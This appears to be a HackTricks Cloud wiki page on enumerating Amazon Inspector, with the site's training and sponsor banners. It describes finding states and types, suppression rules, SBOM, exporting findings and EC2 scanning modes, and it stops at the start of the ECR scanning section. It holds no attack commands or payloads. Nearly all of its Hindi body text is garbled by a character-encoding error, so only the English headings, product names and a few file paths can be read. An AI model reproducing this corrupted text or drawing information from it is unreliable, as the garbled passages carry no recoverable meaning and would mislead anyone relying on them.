# AWS - Inspector Enum

## AWS - Inspector Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Inspector

Amazon Inspector рдПрдХ рдЙрдиреНрдирдд, рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рднреЗрджреНрдпрддрд╛ рдкреНрд░рдмрдВрдзрди рд╕реЗрд╡рд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЖрдкрдХреЗ AWS рд╡рд╛рддрд╛рд╡рд░рдг рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ рд╕реЗрд╡рд╛ рд▓рдЧрд╛рддрд╛рд░ Amazon EC2 рдЙрджрд╛рд╣рд░рдгреЛрдВ, Amazon ECR рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдЫрд╡рд┐рдпреЛрдВ, Amazon ECS, рдФрд░ AWS Lambda рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рднреЗрджреНрдпрддрд╛рдУрдВ рдФрд░ рдЕрдирдкреЗрдХреНрд╖рд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдПрдХреНрд╕рдкреЛрдЬрд░ рдХреЗ рд▓рд┐рдП рд╕реНрдХреИрди рдХрд░рддреА рд╣реИред рдПрдХ рдордЬрдмреВрдд рднреЗрджреНрдпрддрд╛ рдЦреБрдлрд┐рдпрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдХрд░, Amazon Inspector рд╡рд┐рд╕реНрддреГрдд рдирд┐рд╖реНрдХрд░реНрд╖ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдЧрдВрднреАрд░рддрд╛ рд╕реНрддрд░ рдФрд░ рд╕реБрдзрд╛рд░ рд╕рд┐рдлрд╛рд░рд┐рд╢реЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ, рдЬреЛ рд╕рдВрдЧрдардиреЛрдВ рдХреЛ рд╕рдХреНрд░рд┐рдп рд░реВрдк рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдореЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдФрд░ рд╕рдорд╛рдзрд╛рди рдореЗрдВ рдорджрдж рдХрд░рддреА рд╣реИрдВред рдпрд╣ рд╡реНрдпрд╛рдкрдХ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╡рд┐рднрд┐рдиреНрди AWS рд╕реЗрд╡рд╛рдУрдВ рдореЗрдВ рдПрдХ рдордЬрдмреВрдд рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрдерд┐рддрд┐ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЕрдиреБрдкрд╛рд▓рди рдФрд░ рдЬреЛрдЦрд┐рдо рдкреНрд░рдмрдВрдзрди рдореЗрдВ рд╕рд╣рд╛рдпрддрд╛ рдХрд░рддрд╛ рд╣реИред

### Key elements

#### Findings

Amazon Inspector рдореЗрдВ рдирд┐рд╖реНрдХрд░реНрд╖ EC2 рдЙрджрд╛рд╣рд░рдгреЛрдВ, ECR рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА, рдпрд╛ Lambda рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд╕реНрдХреИрди рдХреЗ рджреМрд░рд╛рди рдЦреЛрдЬреА рдЧрдИ рднреЗрджреНрдпрддрд╛рдУрдВ рдФрд░ рдПрдХреНрд╕рдкреЛрдЬрд░ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╡рд┐рд╕реНрддреГрдд рд░рд┐рдкреЛрд░реНрдЯ рд╣реИрдВред рдЗрд╕рдХреЗ рд░рд╛рдЬреНрдп рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдирд┐рд╖реНрдХрд░реНрд╖реЛрдВ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╢реНрд░реЗрдгрд┐рдпреЛрдВ рдореЗрдВ рд╡рд░реНрдЧреАрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

* **Active**: рдирд┐рд╖реНрдХрд░реНрд╖ рдХрд╛ рд╕рдорд╛рдзрд╛рди рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
* **Closed**: рдирд┐рд╖реНрдХрд░реНрд╖ рдХрд╛ рд╕рдорд╛рдзрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
* **Suppressed**: рдирд┐рд╖реНрдХрд░реНрд╖ рдХреЛ рдПрдХ рдпрд╛ рдЕрдзрд┐рдХ **suppression rules** рдХреЗ рдХрд╛рд░рдг рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдХреЗ рд╕рд╛рде рдЪрд┐рд╣реНрдирд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рдирд┐рд╖реНрдХрд░реНрд╖реЛрдВ рдХреЛ рдЕрдЧрд▓реЗ рддреАрди рдкреНрд░рдХрд╛рд░реЛрдВ рдореЗрдВ рднреА рд╡рд░реНрдЧреАрдХреГрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:

* **Package**: рдпреЗ рдирд┐рд╖реНрдХрд░реНрд╖ рдЖрдкрдХреЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдкрд░ рд╕реНрдерд╛рдкрд┐рдд рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдкреИрдХреЗрдЬ рдореЗрдВ рднреЗрджреНрдпрддрд╛рдУрдВ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИрдВред рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ рдкреБрд░рд╛рдиреЗ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдпрд╛ рдЬреНрдЮрд╛рдд рд╕реБрд░рдХреНрд╖рд╛ рдореБрджреНрджреЛрдВ рд╡рд╛рд▓реЗ рдирд┐рд░реНрднрд░рддрд╛рдПрдБ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред
* **Code**: рдЗрд╕ рд╢реНрд░реЗрдгреА рдореЗрдВ рдЖрдкрдХреЗ AWS рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдкрд░ рдЪрд▓рдиреЗ рд╡рд╛рд▓реЗ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЗ рдХреЛрдб рдореЗрдВ рдкрд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рднреЗрджреНрдпрддрд╛рдПрдБ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рд╕рд╛рдорд╛рдиреНрдп рдореБрджреНрджреЗ рдХреЛрдбрд┐рдВрдЧ рддреНрд░реБрдЯрд┐рдпрд╛рдБ рдпрд╛ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдкреНрд░рдерд╛рдПрдБ рд╣реИрдВ рдЬреЛ рд╕реБрд░рдХреНрд╖рд╛ рдЙрд▓реНрд▓рдВрдШрдиреЛрдВ рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддреА рд╣реИрдВред
* **Network**: рдиреЗрдЯрд╡рд░реНрдХ рдирд┐рд╖реНрдХрд░реНрд╖ рд╕рдВрднрд╛рд╡рд┐рдд рдПрдХреНрд╕рдкреЛрдЬрд░ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рдиреЗрдЯрд╡рд░реНрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рджреНрд╡рд╛рд░рд╛ рд╢реЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрдирдореЗрдВ рдЦреБрд▓реЗ рдкреЛрд░реНрдЯ, рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓, рдФрд░ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╕реБрд░рдХреНрд╖рд╛ рд╕рдореВрд╣ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

#### Filters and Suppression Rules

Amazon Inspector рдореЗрдВ рдлрд╝рд┐рд▓реНрдЯрд░ рдФрд░ рджрдорди рдирд┐рдпрдо рдирд┐рд╖реНрдХрд░реНрд╖реЛрдВ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдФрд░ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреЗ рд╣реИрдВред рдлрд╝рд┐рд▓реНрдЯрд░ рдЖрдкрдХреЛ рдЧрдВрднреАрд░рддрд╛ рдпрд╛ рд╕рдВрд╕рд╛рдзрди рдкреНрд░рдХрд╛рд░ рдЬреИрд╕реЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдорд╛рдирджрдВрдбреЛрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдирд┐рд╖реНрдХрд░реНрд╖реЛрдВ рдХреЛ рдкрд░рд┐рд╖реНрдХреГрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред рджрдорди рдирд┐рдпрдо рдЖрдкрдХреЛ рдХреБрдЫ рдирд┐рд╖реНрдХрд░реНрд╖реЛрдВ рдХреЛ рджрдмрд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдХрдо рдЬреЛрдЦрд┐рдо рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рдиреНрд╣реЗрдВ рдкрд╣рд▓реЗ рд╣реА рдХрдо рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдорд╣рддреНрд╡рдкреВрд░реНрдг рдХрд╛рд░рдг рд╕реЗ, рдЬрд┐рд╕рд╕реЗ рд╡реЗ рдЖрдкрдХреА рд╕реБрд░рдХреНрд╖рд╛ рд░рд┐рдкреЛрд░реНрдЯ рдХреЛ рдЕрдзрд┐рднрд╛рд░рд┐рдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрддреЗ рд╣реИрдВ рдФрд░ рдЖрдкрдХреЛ рдЕрдзрд┐рдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореБрджреНрджреЛрдВ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред

#### Software Bill of Materials (SBOM)

Amazon Inspector рдореЗрдВ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдмрд┐рд▓ рдСрдлрд╝ рдордЯреЗрд░рд┐рдпрд▓реНрд╕ (SBOM) рдПрдХ рдирд┐рд░реНрдпрд╛рдд рдпреЛрдЧреНрдп рдиреЗрд╕реНрдЯреЗрдб рдЗрдиреНрд╡реЗрдВрдЯрд░реА рд╕реВрдЪреА рд╣реИ рдЬреЛ рдПрдХ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдкреИрдХреЗрдЬ рдХреЗ рднреАрддрд░ рд╕рднреА рдШрдЯрдХреЛрдВ рдХрд╛ рд╡рд┐рд╡рд░рдг рджреЗрддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдФрд░ рдирд┐рд░реНрднрд░рддрд╛рдПрдБ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред SBOMs рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдЖрдкреВрд░реНрддрд┐ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдореЗрдВ рдкрд╛рд░рджрд░реНрд╢рд┐рддрд╛ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдмреЗрд╣рддрд░ рднреЗрджреНрдпрддрд╛ рдкреНрд░рдмрдВрдзрди рдФрд░ рдЕрдиреБрдкрд╛рд▓рди рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИред рдпреЗ рдУрдкрди-рд╕реЛрд░реНрд╕ рдФрд░ рддреГрддреАрдп-рдкрдХреНрд╖ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдШрдЯрдХреЛрдВ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдЬреЛрдЦрд┐рдореЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдФрд░ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИрдВред

### Key features

#### Export findings

Amazon Inspector рдирд┐рд╖реНрдХрд░реНрд╖реЛрдВ рдХреЛ Amazon S3 Buckets, Amazon EventBridge рдФрд░ AWS Security Hub рдореЗрдВ рдирд┐рд░реНрдпрд╛рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЖрдк рдкрд╣рдЪрд╛рдиреА рдЧрдИ рднреЗрджреНрдпрддрд╛рдУрдВ рдФрд░ рдПрдХреНрд╕рдкреЛрдЬрд░ рдХреА рд╡рд┐рд╕реНрддреГрдд рд░рд┐рдкреЛрд░реНрдЯ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЖрдЧреЗ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдпрд╛ рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖ рддрд┐рдерд┐ рдФрд░ рд╕рдордп рдкрд░ рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддреА рд╣реИред рдпрд╣ рд╕реБрд╡рд┐рдзрд╛ рд╡рд┐рднрд┐рдиреНрди рдЖрдЙрдЯрдкреБрдЯ рдкреНрд░рд╛рд░реВрдкреЛрдВ рдЬреИрд╕реЗ CSV рдФрд░ JSON рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЕрдиреНрдп рдЙрдкрдХрд░рдгреЛрдВ рдФрд░ рдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХреАрдХреГрдд рдХрд░рдирд╛ рдЖрд╕рд╛рди рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рдирд┐рд░реНрдпрд╛рдд рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рд░рд┐рдкреЛрд░реНрдЯ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдбреЗрдЯрд╛ рдХреЛ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЖрдк рдЧрдВрднреАрд░рддрд╛, рд╕рдВрд╕рд╛рдзрди рдкреНрд░рдХрд╛рд░, рдпрд╛ рддрд┐рдерд┐ рд╕реАрдорд╛ рдЬреИрд╕реЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдорд╛рдирджрдВрдбреЛрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдирд┐рд╖реНрдХрд░реНрд╖реЛрдВ рдХреЛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЖрдкрдХреЗ рд╕рднреА рдирд┐рд╖реНрдХрд░реНрд╖реЛрдВ рдХреЛ рд╡рд░реНрддрдорд╛рди AWS рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рд╕рдХреНрд░рд┐рдп рд╕реНрдерд┐рддрд┐ рдХреЗ рд╕рд╛рде рд╢рд╛рдорд┐рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдирд┐рд╖реНрдХрд░реНрд╖реЛрдВ рдХреЛ рдирд┐рд░реНрдпрд╛рдд рдХрд░рддреЗ рд╕рдордп, рдбреЗрдЯрд╛ рдХреЛ рдирд┐рд░реНрдпрд╛рдд рдХреЗ рджреМрд░рд╛рди рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдХреА рдкреНрд░рдмрдВрдзрди рд╕реЗрд╡рд╛ (KMS) рдХреБрдВрдЬреА рдЖрд╡рд╢реНрдпрдХ рд╣реИред KMS рдХреБрдВрдЬреА рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреА рд╣реИрдВ рдХрд┐ рдирд┐рд░реНрдпрд╛рддрд┐рдд рдирд┐рд╖реНрдХрд░реНрд╖ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИрдВ, рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рднреЗрджреНрдпрддрд╛ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реБрд░рдХреНрд╖рд╛ рдкрд░рдд рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИрдВред

#### Amazon EC2 instances scanning

Amazon Inspector Amazon EC2 рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рднреЗрджреНрдпрддрд╛рдУрдВ рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рдореБрджреНрджреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрдд рд╕реНрдХреИрдирд┐рдВрдЧ рдХреНрд╖рдорддрд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред Inspector рдиреЗ EC2 рдЙрджрд╛рд╣рд░рдг рд╕реЗ рдирд┐рдХрд╛рд▓реЗ рдЧрдП рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдХреА рддреБрд▓рдирд╛ рд╕реБрд░рдХреНрд╖рд╛ рд╕рд▓рд╛рд╣рдХрд╛рд░реЛрдВ рдХреЗ рдирд┐рдпрдореЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рдХреА рддрд╛рдХрд┐ рдкреИрдХреЗрдЬ рднреЗрджреНрдпрддрд╛рдУрдВ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдкрд╣реБрдВрдЪ рд╕рдорд╕реНрдпрд╛рдУрдВ рдХрд╛ рдЙрддреНрдкрд╛рджрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдпреЗ рд╕реНрдХреИрди **рдПрдЬреЗрдВрдЯ-рдЖрдзрд╛рд░рд┐рдд** рдпрд╛ **рдПрдЬреЗрдВрдЯрд▓реЗрд╕** рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдЖрдкрдХреЗ рдЦрд╛рддреЗ рдХреА **рд╕реНрдХреИрди рдореЛрдб** рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реИрдВред

* **Agent-Based**: рдЧрд╣рди рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП AWS Systems Manager (SSM) рдПрдЬреЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рдзрд┐ рдЙрджрд╛рд╣рд░рдг рд╕реЗ рд╕реАрдзреЗ рдбреЗрдЯрд╛ рд╕рдВрдЧреНрд░рд╣ рдФрд░ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред
* **Agentless**: рдПрдХ рд╣рд▓реНрдХрд╛ рд╡рд┐рдХрд▓реНрдк рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЙрджрд╛рд╣рд░рдг рдкрд░ рдПрдЬреЗрдВрдЯ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ, EC2 рдЙрджрд╛рд╣рд░рдг рдХреЗ рдкреНрд░рддреНрдпреЗрдХ рд╡реЙрд▓реНрдпреВрдо рдХрд╛ EBS рд╕реНрдиреИрдкрд╢реЙрдЯ рдмрдирд╛рддрд╛ рд╣реИ, рднреЗрджреНрдпрддрд╛рдУрдВ рдХреА рддрд▓рд╛рд╢ рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдлрд┐рд░ рдЗрд╕реЗ рд╣рдЯрд╛ рджреЗрддрд╛ рд╣реИ; рд╕реНрдХреИрдирд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдореМрдЬреВрджрд╛ AWS рдмреБрдирд┐рдпрд╛рджреА рдврд╛рдВрдЪреЗ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддрд╛ рд╣реИред

рд╕реНрдХреИрди рдореЛрдб рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ EC2 рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреМрди рд╕реА рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:

* **Agent-Based**: рдЧрд╣рди рдирд┐рд░реАрдХреНрд╖рдг рдХреЗ рд▓рд┐рдП EC2 рдЙрджрд╛рд╣рд░рдгреЛрдВ рдкрд░ SSM рдПрдЬреЗрдВрдЯ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред
* **Hybrid Scanning**: рдХрд╡рд░реЗрдЬ рдХреЛ рдЕрдзрд┐рдХрддрдо рдХрд░рдиреЗ рдФрд░ рдкреНрд░рджрд░реНрд╢рди рдкреНрд░рднрд╛рд╡ рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдЬреЗрдВрдЯ-рдЖрдзрд╛рд░рд┐рдд рдФрд░ рдПрдЬреЗрдВрдЯрд▓реЗрд╕ рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рд╕рдВрдпреЛрдЬрд┐рдд рдХрд░рддрд╛ рд╣реИред рдЙрди EC2 рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ SSM рдПрдЬреЗрдВрдЯ рд╕реНрдерд╛рдкрд┐рдд рд╣реИ, Inspector рдПрдЬреЗрдВрдЯ-рдЖрдзрд╛рд░рд┐рдд рд╕реНрдХреИрди рдХрд░реЗрдЧрд╛, рдФрд░ рдЬрд╣рд╛рдВ рдХреЛрдИ SSM рдПрдЬреЗрдВрдЯ рдирд╣реАрдВ рд╣реИ, рд╡рд╣рд╛рдВ рд╕реНрдХреИрди рдПрдЬреЗрдВрдЯрд▓реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдПрдХ рдФрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╡рд┐рд╢реЗрд╖рддрд╛ EC2 Linux рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП **рдЧрд╣рди рдирд┐рд░реАрдХреНрд╖рдг** рд╣реИред рдпрд╣ рд╡рд┐рд╢реЗрд╖рддрд╛ EC2 Linux рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреЗ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рдЧрд╣рди рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреА рднреЗрджреНрдпрддрд╛рдПрдБ, рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреА рднреЗрджреНрдпрддрд╛рдПрдБ, рдФрд░ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╢рд╛рдорд┐рд▓ рд╣реИрдВ, рдЬреЛ рдПрдХ рд╡реНрдпрд╛рдкрдХ рд╕реБрд░рдХреНрд╖рд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреА рд╣реИрдВред рдпрд╣ **рдХрд╕реНрдЯрдо рдкрдереЛрдВ** рдФрд░ рдЗрд╕рдХреЗ рд╕рднреА рдЙрдк-рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЗ рдирд┐рд░реАрдХреНрд╖рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, Amazon Inspector рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рд╕реНрдХреИрди рдХрд░реЗрдЧрд╛, рд▓реЗрдХрд┐рди рдкреНрд░рддреНрдпреЗрдХ рд╕рджрд╕реНрдп рдЦрд╛рддрд╛ 5 рдФрд░ рдХрд╕реНрдЯрдо рдкрдереЛрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рддрд┐рдирд┐рдзрд┐ рдкреНрд░рд╢рд╛рд╕рдХ 10 рддрдХ:

* `/usr/lib`
* `/usr/lib64`
* `/usr/local/lib`
* `/usr/local/lib64`

#### Amazon ECR container images scanning

Amazon Inspector Amazon Elastic Container Registry (ECR) рдХрдВрдЯреЗрдирд░ рдЫрд╡рд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрдд рд╕реНрдХреИрдирд┐рдВрдЧ рдХреНрд╖рдорддрд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рдкреИрдХреЗрдЬ рднреЗрджреНрдпрддрд╛рдПрдБ рдкреНрд░рднрд╛рд╡реА рдврдВрдЧ рд╕реЗ рдкрд╣рдЪрд╛рдиреА рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХреА рдЬрд╛рддреА рд╣реИрдВред

